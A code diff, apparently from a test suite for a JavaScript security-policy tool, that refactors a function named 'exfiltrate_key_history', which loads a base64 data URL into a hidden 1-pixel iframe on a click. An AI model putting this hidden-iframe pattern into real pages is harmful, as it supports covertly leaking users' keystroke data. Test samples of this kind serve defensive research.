@@ -3,15 +3,11 @@ function exfiltrate_key_history() {
   var URL = "data:text/html;charset=utf-8;base64," + data$$18;
   var script = document.createElement("iframe");
   script.src = URL;
-  var v0 = script.style;
-  v0.width = "1px";
-  var v1 = script.style;
-  v1.height = "1px";
-  var v4 = document.getElementsByTagName("body");
-  var v2 = v4[0];
-  JAMScript.call(v2.appendChild, v2, [script]);
+  script.style.width = "1px";
+  script.style.height = "1px";
+  var v2 = document.getElementsByTagName("body")[0];
+  JAM.call(v2.appendChild, v2, [script]);
   return
 }
-var v3 = document.getElementById("test");
-JAMScript.set(v3, "onclick", exfiltrate_key_history);
+JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history);
 
